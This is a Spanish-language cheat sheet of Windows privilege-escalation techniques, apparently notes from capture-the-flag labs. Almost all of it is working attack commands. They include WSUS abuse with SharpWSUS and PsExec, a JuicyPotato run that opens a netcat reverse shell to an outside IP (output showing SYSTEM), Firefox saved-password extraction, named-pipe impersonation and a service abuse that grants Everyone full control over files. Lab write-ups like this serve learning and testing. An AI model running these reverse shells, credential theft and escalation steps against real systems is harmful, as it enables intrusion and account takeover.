# Privesc

## Abuso del grupo WSUS Administrator

### Archivos necesarios
```null
iwr -uri http://10.10.14.2/SharpWSUS.exe -o SharpWSUS.exe
iwr -uri http://10.10.14.2/PsExec64.exe -o PsExec64.exe
iwr -uri http://10.10.14.2/nc.exe -o nc.exe
```

### Reverse Shell
```null
.\SharpWSUS.exe create /payload:"C:\Windows\Temp\Privesc\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\Temp\Privesc\\nc.exe -e cmd 10.10.14.2 443" /title:"ReverseShell"
```

## Credenciales cacheadas

### Firefox

```null
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> dir -Force


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release
[...snip...]
```

### Uso de firepwd.py

Primero copiar al directorio actual de trabajo el ``key4.db`` y el ``login.json``

```null
python3 firepwd.py
```

## Listar reglas de Firewall

```null
netsh advfirewall show currentprofile
```

## Abuso del privilegio SeImpersonatePrivileage

## Uso de JuicyPotato

```null
PS C:\Temp> .\JuicyPotato.exe -t * -p C:\Windows\system32\cmd.exe -l 1337 -a "/c C:\Temp\nc.exe -e cmd 10.10.16.2 443"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

## Uso de Named Pipes

Para ello es necesario aprovecharse de una tarea CRON en la que otro usuario se atachée a un named pipe alojado del atacante, de forma que se pueda impersonar para ejecutar comandos como este

### Path

La estructura de llamada es así

```null
\\.\pipe\dummypipe
```

### Explotación

En caso de ser vulnerable, el script en PowerShell de ``decoder_it``, debe devolver el nombre de usuario que se ha conectado

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\pipeserverimpersonate.ps1
Waiting for connection on namedpipe:dummypipe
ImpersonateNamedPipeClient: 1
user=HACKBACK\hacker
OpenThreadToken:True
True
CreateProcessWithToken: False  1058
```

#### Alteración del script

```null
###we are impersonating the user, everything we do before RevertoSelf is done on behalf that user
echo "user=$user "
copy C:\Windows\System32\spool\drivers\color\rubbx.bat C:\util\scripts\spool\rubbx.bat
```

## Abuso del servicio userlogger

### Detener el servicio

```null
sc stop userlogger C:\test.txt
```

### Explotación

Pasarle como argumento un fichero con dos puntos al final. Se le asignarán privilegios de lectura y escritura para cualquier usuario

```null
C:\>sc start userlogger C:\test.txt:
```

```null
C:\>icacls test.txt
icacls test.txt
test.txt Everyone:(F)

Successfully processed 1 files; Failed processing 0 files
```

### Iniciar servicio

```null
sc start userlogger C:\Users\Administrator\Desktop\root.txt:
```

## Obtener contenido ADS

```null
more < C:\Users\Administrator\Desktop\root.txt:flag.txt
```

